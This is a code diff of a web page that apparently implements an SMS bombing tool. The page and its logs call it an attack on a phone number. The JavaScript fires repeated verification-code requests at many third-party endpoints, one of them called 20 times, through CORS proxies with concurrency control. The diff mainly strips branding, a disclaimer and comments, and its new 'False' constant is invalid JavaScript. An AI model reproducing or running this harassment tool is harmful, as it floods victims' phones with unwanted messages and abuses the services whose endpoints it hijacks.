@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="logo.ico" type="image/x-icon">
     <link rel="shortcut icon" href="logo.ico" type="image/x-icon">
-    <title>SMS短信压力测试系统</title>
+    <title>System</title>
     <style>
         body {
     font-family: 'Arial', sans-serif;
@@ -250,7 +250,7 @@ button:hover {
     <div class="container">
     </div>
     <div class="desr">
-    <h2>Safety box攻击系统</h2><br />
+    <h2>System</h2><br />
     </div>
 </div>
     <form id="postForm">
@@ -268,7 +268,7 @@ button:hover {
   
 <div class="card">
         <h3>使用方法</h3>
-        <p>填写手机号，点击“开始发送”按钮即可发起攻击<br /><br />本程序仅用于短信测压和学习交流，请勿用于非法用途，使用本程序造成的一切后果由使用者自行承担<br /><br />你可以选择进入官方频道下载付费软件<br />
+        <p>填写手机号，点击“开始发送”按钮<br />
             <!DOCTYPE html>
 <html>
 
@@ -297,7 +297,7 @@ button:hover {
       
       setTimeout(() => {
         btn.style.transform = 'scale(1)';
-                            window.location.href = 'https://mp.weixin.qq.com/s/4qIBy5UUtAkEvNwHAej13Q';
+                            window.location.href = 'https://www.baidu.com/';
       }, 100);
     }
   </script>
@@ -313,8 +313,6 @@ button:hover {
 </script>
 
     <script>
-
-        // ⭐ Unipus 接口定义（100%成功率）
         const unipusAPI = {
             url: (phoneNumber, times) => {
                 const timestamp = Date.now() + Math.floor(Math.random() * 1000); // 添加随机偏移
@@ -329,13 +327,9 @@ button:hover {
             }),
             data: (phoneNumber, times) => ({})
         };
-        
-        // 创建 Unipus 接口的 20 个副本（循环调用20次）
         const unipusAPIs = Array(20).fill(null).map(() => ({...unipusAPI}));
-        
         const apiRequests = [
-           ...unipusAPIs, // ⭐ Unipus 接口循环20次
-           // 以下是其他154个接口，保持不变
+           ...unipusAPIs,
            {
                url: 'http://47.95.130.254/tms-ctwl/orderRegisterUser/getPollCode',
                method: 'POST_FORM',
@@ -3373,13 +3367,13 @@ button:hover {
         ];
         
         // CORS代理配置（彻底解决版）
-        const USE_CORS_PROXY = true; // 设置为true启用CORS代理
+        const USE_CORS_PROXY = False; // 设置为true启用CORS代理
         
         // 多个代理备选列表（自动切换）
         // ⭐ 优先使用当前站点的本地代理，其次是自定义域名代理
         const CORS_PROXIES = [
             '/',                                                        // ✅ 本地 Page Functions 代理（首选）
-            'https://cf.zk99999.dpdns.org/',                            // ✅ 新增 CF 路由代理（备用）
+            '/',                            // ✅ 新增 CF 路由代理（备用）
         ];
         
         let currentProxyIndex = 0; // 当前使用的代理索引
@@ -3597,7 +3591,7 @@ button:hover {
     const statusStats = {};
     
     console.log('🚀 开始发送请求...');
-    console.log(`📱 手机号: ${phoneNumber}`);
+    console.log(`📱 PhoneNumber: ${phoneNumber}`);
     console.log(`🔢 攻击次数: ${times}`);
     console.log(`⚙️  并发控制: 最大${MAX_CONCURRENT}个并发`);
     console.log('─'.repeat(60));
